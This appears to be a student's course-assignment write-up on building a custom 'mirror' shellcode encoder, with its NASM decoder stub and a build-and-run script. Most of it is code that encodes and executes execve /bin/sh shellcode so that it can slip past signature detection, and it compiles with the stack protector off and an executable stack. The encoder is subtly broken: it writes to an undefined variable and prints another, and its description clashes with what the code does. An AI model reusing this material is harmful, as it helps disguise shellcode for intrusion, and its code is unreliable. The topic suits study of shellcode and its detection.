# Assignment 4

## What to do:

-Create a custom encoding scheme like the “Insertion Encoder” we showed you. 

-PoC with using execve-stack as the shellcode to encode with your schema and execute.

## Solution: 
  1) Create the encoder.
  
  The encoder created (Mirror_encoder.py) takes the every 4 bytes of the shellcode and reverse its order, meaning, if the string taken is 0x45a3, the resultant will be 0xa345 (this is done until the end of the shellcode is reached). In case the shellcode has not even length, 0xf0 is added to the end of the shellcode to allow the "mirror" modification. 0xf0f0 is appended to the final shellcode as the marker which will be used to stop the nasm decoder.
    
  ######### Mirror-Encoder.py
  
    for x in bytearray(shellcode):  #Add to shell the shellcode as hexadecimal format
      shell += '\\x' + '%02x' % x

    shell2 = ""
    for i in range(0,4*len(bytearray(shellcode)),8): #Loop which takes 2 bytes and swap its order
      if (len(shell[i+1:i+4]) + len(shell[i+5:i+8]))==6:
        shell3 += "0"+ shell[i+5:i+8] + "," + "0"+shell[i+1:i+4] + ","
      elif (len(shell[i+1:i+4]) + len(shell[i+5:i+8]))==3: #If the length of the shellcode is not even, it is added 0xf0 to make it even. 
        shell3 += "0xf0" + "," + "0"+shell[i+1:i+4] + ","


    print shell2 + "0xf0,0xf0" #Marker to finish the decoder
    
  2) PoC with using execve-stack as the shellcode to encode.
  
   * The shellcode to be used is the one obtained from the execve-stack binary.
    
    nasm -f elf32 -o execve.o execve.nasm
    ld -o execve execve.o
    objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
   
   3) Create the nasm decoder.
   
   * The shellcode obtained in the earlier step, must be passed to Mirror_Encoder.py where is "mirrored".
   
   * Now, we have the shellcode to inject into the Mirror_decoder.nasm
   
  ######### Mirror-decoder-compile.sh
  
    global _start			

    section .text
    _start:

      jmp short call_shellcode  ;jump-call-pop technique

    decoder:

      pop esi			; pop shellcode into esi
      lea edi, [esi]		; Copy the position in memory of the shellcode to edi, where we will save the decoded one
      xor eax, eax		; Clearing out eax and ecx
      xor ecx, ecx

    decode:
      mov ax, [esi]                ; Moves the first to bytes of esi to ax
      mov cx, ax		     ;Moves ax to cx to check if it is the end of the shellcode
      xor cx, 0xf0f0               ; Compare cx with 0xf0f0 marker
      jz short EncodedShellcode    ; if xor os 0, jump to shellcode
      mov byte [edi], ah           ;Move the second byte to the first byte of edi
      mov byte [edi + 1], al;      ; Move the first byte to the second byte of edi --> 0x31c0 moves to 0xc031 in edi 	
      inc edi			     ; move to next byte in edi
      inc edi			     ; move to next byte in edi	
      inc esi			     ; move to next byte in esi
      inc esi                      ; move to next byte in esi 
      jmp short decode	     ; jump back to start of decode

    ;Modifications can be vieweb by using x/20xc *call during execution (gdb)	

    call_shellcode:

    call decoder
    EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x2f,0x2f,0x68,0x73,0x2f,0x68,0x69,0x62,0x89,0x6e,0x50,0xe3,0xe2,0x89,0x89,0x53,0xb0,0xe1,0xcd,0x0b,0xf0,0x80,0xf0,0xf0,0xee,0xee

4) Compiling the final shellcode
    
* Once the nasm code is finished, we can use mirror-decoder-compile.sh to assembly and link it, copy the shellcode to the skeleton_shellcode.c, compile the final shellcode and execute it.
   
    ######### Mirror-decoder-compile.sh
    
          echo '[+] Assembling with Nasm ... '
          nasm -f elf32 -o mirror-decode.o mirror-decode.nasm

          echo '[+] Linking ...'
          ld -o mirror-decode mirror-decode.o

          echo '[+] Done!'

          sleep 2

          echo "[+] Dumping disassembling code.."

          objdump=$(objdump -d ./mirror-decode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')

          echo $objdump 
          sleep 3

          echo "[+] Compiling shellcode.c and executing it.."

          cp skeleton_shellcode.c shellcode.c  #Copy the skeleton of the shellcode (it contais a string named shellcode which it will be replaced with objdump)

          replace "shellcode" "$objdump" -- shellcode.c &>/dev/null #Replace shellcode dump

          sleep 2

          gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode


          ./shellcode    
